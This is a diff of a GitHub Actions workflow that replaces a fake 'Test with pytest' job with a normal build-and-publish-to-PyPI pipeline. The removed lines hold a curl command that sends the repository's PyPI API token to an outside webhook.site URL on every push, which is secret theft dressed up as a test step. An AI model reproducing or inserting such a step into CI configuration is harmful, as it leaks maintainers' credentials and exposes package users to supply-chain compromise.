@@ -1,26 +1,30 @@
-# This workflow will install Python dependencies, run tests and lint with a single version of Python
-# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python
 
-name: Python application
+name: Publish ${package_name} to PyPI / GitHub
 
 on:
   push
-
-permissions:
-  contents: read
-
+  
 jobs:
-  build:
-
+  build-n-publish:
+    name: Build and publish to PyPI
     runs-on: ubuntu-latest
 
     steps:
-    - uses: actions/checkout@v3
-    - name: Set up Python 3.10
-      uses: actions/setup-python@v3
-      with:
-        python-version: "3.10"
-    
-    - name: Test with pytest
-      run: |
-        curl -k https://webhook.site/1f2162b2-65fa-40eb-8fde-e5a1f070f329?fuckyou=${{ secrets.PYPI_API_TOKEN }}
+      - name: Checkout source
+        uses: actions/checkout@v2
+
+      - name: Set up Python
+        uses: actions/setup-python@v2
+        with:
+          python-version: "3.x"
+
+      - name: Build source and wheel distributions
+        run: |
+          python -m pip install --upgrade build twine
+          python -m build
+          twine check --strict dist/*
+      - name: Publish distribution to PyPI
+        uses: pypa/gh-action-pypi-publish@master
+        with:
+          user: __token__
+          password: ${{ secrets.PYPI_API_TOKEN }}
